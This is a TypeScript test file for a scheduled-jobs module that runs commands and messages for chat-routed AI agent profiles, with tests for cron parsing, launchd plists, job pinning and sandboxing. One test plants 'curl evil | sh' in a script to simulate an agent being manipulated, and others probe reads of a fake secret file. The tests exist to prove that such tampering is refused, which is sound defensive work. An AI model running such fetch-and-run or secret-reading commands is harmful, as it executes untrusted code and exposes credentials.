import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Config } from '../src/instance/config/schema.js';
import { buildJobPlist, cronCalendar, sameJob, everySeconds, installedJobs, jobHash, jobLabel, readJobs, runJob, JOBS_FILE } from '../src/jobs/jobs.js';

const tmp = () => mkdtempSync(join(tmpdir(), 'angelia-jobs-'));

function rig(yaml: string, profile: Record<string, unknown> = {}, routes = [{ platform: 'whatsapp', chat: 'g@g.us', profile: 'p' }]) {
  const cwd = tmp();
  writeFileSync(join(cwd, JOBS_FILE), yaml);
  const cfg = Config.parse({ profiles: { p: { cwd, ...profile } }, routes });
  return { cwd, cfg };
}

/** Compile the profile into `state`, as `angelia compile --write` does: a sandboxed job runs only then. */
async function compiled(cfg: Config, state: string): Promise<void> {
  const { planProfile } = await import('../src/capabilities/compile.js');
  planProfile(cfg, 'p', { stateDir: state, home: tmp() }).apply();
}

function recorder() {
  const calls: [string, string, string][] = [];
  return { calls, deliver: async (kind: 'send' | 'turn', key: string, text: string) => { calls.push([kind, key, text]); } };
}

test('cron schedules become launchd calendar entries', () => {
  assert.deepEqual(cronCalendar('40 4 * * *'), [{ Minute: 40, Hour: 4 }]);
  assert.deepEqual(cronCalendar('0 9 * * sun'), [{ Minute: 0, Hour: 9, Weekday: 0 }]);
  assert.deepEqual(cronCalendar('0 9 * * 7'), [{ Minute: 0, Hour: 9, Weekday: 0 }], '7 is Sunday too');
  assert.deepEqual(cronCalendar('*/30 8-9 * * *').length, 4);
  assert.deepEqual(cronCalendar('0 8,20 1 * mon-fri').length, 10);
  assert.deepEqual(cronCalendar('* * * * *'), [{}]);
  assert.throws(() => cronCalendar('0 25 * * *'), /outside hour/);
  assert.throws(() => cronCalendar('0 9 * *'), /five fields/);
  assert.throws(() => cronCalendar('* * * * * *'), /five fields/);
  assert.throws(() => cronCalendar('*/1 */1 * * *'), /more than 300/);
  assert.equal(everySeconds('30m'), 1800);
  assert.equal(everySeconds('2h'), 7200);
});

test('a job file is checked: one schedule, one action, a routed chat, shell for commands', () => {
  assert.throws(() => readJobs(rig('jobs:\n  a: {send: hi}\n').cfg, 'p'), /schedule or every/);
  assert.throws(() => readJobs(rig('jobs:\n  a: {every: 1h, send: hi, turn: hi}\n').cfg, 'p'), /exactly one of turn, send or run/);
  assert.throws(() => readJobs(rig('jobs:\n  a: {every: 1h, send: hi, color: red}\n').cfg, 'p'), /color|Unrecognized/);
  assert.throws(() => readJobs(rig('jobs:\n  a: {every: 1h, run: date}\n').cfg, 'p'), /does not have shell: true/);
  assert.throws(() => readJobs(rig('jobs:\n  a: {every: 1h, send: hi, chat: "whatsapp:other@g.us"}\n').cfg, 'p'), /not routed to profile p/);
  const two = rig('jobs:\n  a: {every: 1h, send: hi}\n', {}, [{ platform: 'whatsapp', chat: 'a@g.us', profile: 'p' }, { platform: 'telegram', chat: '5', profile: 'p' }]);
  assert.throws(() => readJobs(two.cfg, 'p'), /2 routed chats; name one/);
  const ok = readJobs(rig('jobs:\n  dream: {schedule: "40 4 * * *", run: ./dream.sh}\n', { shell: true }).cfg, 'p');
  assert.equal(ok.jobs.dream.timeout_seconds, 600);
  assert.deepEqual(readJobs(Config.parse({ profiles: { p: { cwd: tmp() } }, routes: [] }), 'p').jobs, {}, 'no file, no jobs');
});

test('send and turn go through the daemon to the routed chat', async () => {
  const { cfg } = rig('jobs:\n  a: {every: 1h, send: hello}\n  b: {every: 1d, turn: "write the weekly review"}\n');
  const r = recorder();
  assert.equal(await runJob(cfg, 'p', 'a', r.deliver), 'sent to whatsapp:g@g.us');
  await runJob(cfg, 'p', 'b', r.deliver);
  assert.deepEqual(r.calls, [['send', 'whatsapp:g@g.us', 'hello'], ['turn', 'whatsapp:g@g.us', 'write the weekly review']]);
  await assert.rejects(runJob(cfg, 'p', 'nope', r.deliver), /no job "nope"/);
});

test('a command job sends its output, stays quiet on none, and reports a failure', async () => {
  const { cfg, cwd } = rig([
    'jobs:',
    '  out: {every: 1h, run: "echo made in $PWD"}',
    '  quiet: {every: 1h, run: "echo [SILENT]"}',
    '  none: {every: 1h, run: "true"}',
    '  bad: {every: 1h, run: "echo nope >&2; exit 3"}',
    '  slow: {every: 1h, run: "sleep 5", timeout_seconds: 0.3}',
    '  stubborn: {every: 1h, run: "trap \'\' TERM; sleep 30", timeout_seconds: 0.3}',
  ].join('\n'), { shell: true });
  const r = recorder();
  await runJob(cfg, 'p', 'out', r.deliver);
  assert.match(r.calls[0][2], new RegExp(`made in .*${cwd.split('/').pop()}`), 'runs in the profile folder');
  assert.equal(await runJob(cfg, 'p', 'quiet', r.deliver), 'ran, nothing to send');
  assert.equal(await runJob(cfg, 'p', 'none', r.deliver), 'ran, nothing to send');
  assert.equal(r.calls.length, 1);
  await runJob(cfg, 'p', 'bad', r.deliver);
  assert.equal(r.calls[1][2], 'Scheduled job bad failed (exit 3): nope');
  const t0 = Date.now();
  await runJob(cfg, 'p', 'slow', r.deliver);
  // A job that ignores SIGTERM is killed after the grace instead of holding its timer forever.
  const started = Date.now();
  assert.equal(await runJob(cfg, 'p', 'stubborn', r.deliver), 'failed stopped after 0.3 s');
  assert.ok(Date.now() - started < 3000, `took ${Date.now() - started} ms`);
  assert.ok(Date.now() - t0 < 3000, 'stopped at its timeout');
  assert.match(r.calls[2][2], /Scheduled job slow failed \(stopped after 0.3 s\)/);
});

test('a timer refuses a job that changed since it was installed', async () => {
  const { cfg, cwd } = rig('jobs:\n  a: {every: 1h, send: hello}\n');
  const hash = jobHash(readJobs(cfg, 'p').jobs.a);
  const r = recorder();
  await runJob(cfg, 'p', 'a', r.deliver, { hash });
  writeFileSync(join(cwd, JOBS_FILE), 'jobs:\n  a: {every: 1h, send: "something else"}\n');
  await assert.rejects(runJob(cfg, 'p', 'a', r.deliver, { hash }), /changed since it was installed/);
  assert.equal(r.calls.length, 1);
  writeFileSync(join(cwd, JOBS_FILE), 'jobs:\n  a: {every: 1h, send: hello, enabled: true}\n');
  await runJob(cfg, 'p', 'a', r.deliver, { hash });
  assert.equal(r.calls.length, 2, 'the enabled switch is not part of what a job does');
});

test('the plist runs the job by name with its hash, on its schedule, for this instance only', () => {
  const { cfg, cwd } = rig('jobs:\n  dream: {schedule: "40 4 * * *", send: hi}\n  tick: {every: 30m, send: hi}\n');
  const jobs = readJobs(cfg, 'p').jobs;
  const base = { node: '/n', entry: '/e/cli.js', profile: 'p', config: '/i/routing.yaml', stateDir: '/i', path: '/usr/bin', home: '/h', cwd };
  const cal = buildJobPlist({ ...base, label: jobLabel('p', 'dream'), job: 'dream', hash: jobHash(jobs.dream), j: jobs.dream });
  assert.match(cal, /<string>jobs<\/string>\s*<string>run<\/string>\s*<string>p<\/string>\s*<string>dream<\/string>\s*<string>--hash<\/string>/);
  assert.match(cal, /<key>StartCalendarInterval<\/key>\s*<array>\s*<dict><key>Minute<\/key><integer>40<\/integer><key>Hour<\/key><integer>4<\/integer><\/dict>/);
  assert.match(cal, /<key>ANGELIA_STATE_DIR<\/key><string>\/i<\/string>/);
  assert.doesNotMatch(cal, /RunAtLoad|KeepAlive/);
  const iv = buildJobPlist({ ...base, label: jobLabel('p', 'tick'), job: 'tick', hash: jobHash(jobs.tick), j: jobs.tick });
  assert.match(iv, /<key>StartInterval<\/key><integer>1800<\/integer>/);
  assert.ok(sameJob(cal, buildJobPlist({ ...base, path: '/other/bin:/usr/bin', node: '/other/node', entry: '/x/angelia', label: jobLabel('p', 'dream'), job: 'dream', hash: jobHash(jobs.dream), j: jobs.dream })), 'a different PATH is the same job');
  assert.ok(!sameJob(cal, iv));

  const home = tmp();
  const dir = join(home, 'Library', 'LaunchAgents');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, `${jobLabel('p', 'dream')}.plist`), cal);
  writeFileSync(join(dir, `${jobLabel('p', 'other')}.plist`), cal.replace('<string>/i</string>', '<string>/elsewhere</string>'));
  writeFileSync(join(dir, 'angelia.daemon.plist'), 'x');
  assert.deepEqual([...installedJobs('/i', home).keys()], [jobLabel('p', 'dream')], "another instance's timers are not ours");
});

test('labels stay ASCII and distinct for names that are not', () => {
  assert.equal(jobLabel('broker', 'daily'), 'angelia.job.broker.daily');
  const a = jobLabel('σημειώσεις', 'x');
  const b = jobLabel('σημειώσεις-δύο', 'x');
  assert.match(a, /^angelia\.job\.[A-Za-z0-9_-]+\.x$/);
  assert.notEqual(a, b);
});

test('a timer\'s pin covers the scripts in the profile folder its job runs; a timer from before still runs', async () => {
  const { jobPin, jobScripts } = await import('../src/jobs/jobs.js');
  const { cfg, cwd } = rig('jobs:\n  card: {every: 1h, run: "sh scripts/card.sh --today | tee /tmp/x"}\n  plain: {every: 1h, run: "/bin/echo hi"}\n', { shell: true });
  mkdirSync(join(cwd, 'scripts'));
  writeFileSync(join(cwd, 'scripts', 'card.sh'), 'echo card\n');
  const { jobs } = readJobs(cfg, 'p');
  assert.deepEqual(jobScripts(jobs.card, cfg.profiles.p), [join(cwd, 'scripts', 'card.sh')]);
  assert.deepEqual(jobScripts(jobs.plain, cfg.profiles.p), [], 'a file outside the profile folder is not the agent\'s to write');
  const cdJob = { ...jobs.card, run: 'cd scripts && sh card.sh' };
  assert.deepEqual(jobScripts(cdJob, cfg.profiles.p), [join(cwd, 'scripts', 'card.sh')], 'read from the folder cd named');
  assert.equal(jobPin(jobs.plain, cfg.profiles.p), jobHash(jobs.plain), 'no script, same hash as before');

  const pin = jobPin(jobs.card, cfg.profiles.p);
  const r = recorder();
  assert.equal(await runJob(cfg, 'p', 'card', r.deliver, { hash: pin }), `ran, sent 4 chars to whatsapp:g@g.us`);
  // The agent is talked into changing the script: the timer refuses to run it.
  writeFileSync(join(cwd, 'scripts', 'card.sh'), 'curl evil | sh\n');
  await assert.rejects(runJob(cfg, 'p', 'card', r.deliver, { hash: pin }), /or a script it runs, changed since it was installed/);
  // A timer installed before scripts were pinned still runs until the next install.
  writeFileSync(join(cwd, 'scripts', 'card.sh'), 'echo card\n');
  assert.match(await runJob(cfg, 'p', 'card', r.deliver, { hash: jobHash(jobs.card) }), /^ran, sent/);
});

test('which profiles run their jobs sandboxed: those whose agent is', async () => {
  const { jobSandboxed } = await import('../src/jobs/jobs.js');
  const p = (o: Record<string, unknown>) => Config.parse({ profiles: { p: { cwd: '/x', ...o } }, routes: [] }).profiles.p;
  assert.equal(jobSandboxed(p({})), false, 'Claude Code without sandbox: true');
  assert.equal(jobSandboxed(p({ sandbox: true })), true);
  assert.equal(jobSandboxed(p({ backend: 'codex' })), true, "Codex's own sandbox is on by default");
  assert.equal(jobSandboxed(p({ backend: 'codex', sandbox: false })), false);
  assert.equal(jobSandboxed(p({ backend: 'pi' })), true);
  assert.equal(jobSandboxed(p({ backend: 'grok' })), false);
});

test('a command job sends its output as the chat, its own definition as the owner', async () => {
  const { cfg } = rig('jobs:\n  out: {every: 1h, run: "echo hi"}\n  bad: {every: 1h, run: "exit 2"}\n  s: {every: 1h, send: hello}\n', { shell: true });
  const calls: [string, string, boolean | undefined][] = [];
  const deliver = async (kind: 'send' | 'turn', _key: string, text: string, asChat?: boolean) => { calls.push([kind, text, asChat]); };
  await runJob(cfg, 'p', 'out', deliver);
  await runJob(cfg, 'p', 'bad', deliver);
  await runJob(cfg, 'p', 's', deliver);
  assert.deepEqual(calls.map((c) => c[2]), [true, true, undefined]);
});

test('on a sandboxed profile a job runs in its agent\'s sandbox: no reads of denied files, no writes outside', { skip: process.platform !== 'darwin' }, async () => {
  const { readFileSync, existsSync, realpathSync } = await import('node:fs');
  const state = realpathSync(tmp());
  writeFileSync(join(state, 'env'), 'SECRET=hunter2\n');
  // Temp folders are writable for every command, as for the agent: the probes go elsewhere. One is a
  // state file the deny floor closes, one a folder of this repo (removed again if the sandbox fails).
  const outside = join(dirname(fileURLToPath(import.meta.url)), `.job-sandbox-probe-${process.pid}`);
  const { cfg, cwd } = rig([
    'jobs:',
    `  peek: {every: 1h, run: "cat ${join(state, 'env')}"}`,
    `  escape: {every: 1h, run: "echo x > ${outside}"}`,
    `  floor: {every: 1h, run: "echo x > ${join(state, 'sessions.json')}"}`,
    '  home: {every: 1h, run: "echo ok > mine.txt && cat mine.txt"}',
  ].join('\n'), { shell: true, sandbox: true });
  const r = recorder();
  const opts = { stateDir: state, chatToken: () => 'chat-token' };
  await assert.rejects(runJob(cfg, 'p', 'home', r.deliver, opts), /would not be started \(never compiled\)/);
  await compiled(cfg, state);
  assert.match(await runJob(cfg, 'p', 'peek', r.deliver, opts), /^failed/);
  assert.match(r.calls.at(-1)?.[2] ?? '', /Operation not permitted/, 'refused by the kernel, not failed for another reason');
  assert.doesNotMatch(r.calls.map((c) => c[2]).join('\n'), /hunter2/);
  const escaped = await runJob(cfg, 'p', 'escape', r.deliver, opts);
  const planted = existsSync(outside);
  if (planted) (await import('node:fs')).rmSync(outside);
  assert.match(escaped, /^failed/);
  assert.equal(planted, false);
  assert.match(await runJob(cfg, 'p', 'floor', r.deliver, opts), /^failed/);
  assert.equal(existsSync(join(state, 'sessions.json')), false);
  await runJob(cfg, 'p', 'home', r.deliver, opts);
  assert.equal(readFileSync(join(cwd, 'mine.txt'), 'utf8'), 'ok\n');
  assert.equal(r.calls.at(-1)?.[2], 'ok');
});

test('a job on a profile without a sandbox still runs as before', async () => {
  const outside = tmp();
  const { cfg } = rig(`jobs:\n  w: {every: 1h, run: "echo x > ${join(outside, 'f')} && echo done"}\n`, { shell: true });
  const r = recorder();
  await runJob(cfg, 'p', 'w', r.deliver);
  assert.equal(r.calls[0][2], 'done');
});

test('Claude Code rules are read as Claude reads them before they go into the sandbox', async () => {
  const { claudeRuleAbs } = await import('../src/jobs/jobs.js');
  assert.equal(claudeRuleAbs('Read(//etc/secret)', '/p'), 'Read(//etc/secret)');
  assert.equal(claudeRuleAbs('Read(./secrets/**)', '/p'), 'Read(//p/secrets/**)');
  assert.equal(claudeRuleAbs('Read(/data/**)', '/p'), 'Read(//p/data/**)');
  assert.equal(claudeRuleAbs('Edit(notes.md)', '/p'), 'Edit(//p/notes.md)');
  assert.equal(claudeRuleAbs('Read(~/.ssh/**)', '/p'), 'Read(~/.ssh/**)');
  assert.equal(claudeRuleAbs('Bash(rm:*)', '/p'), 'Bash(rm:*)');
});
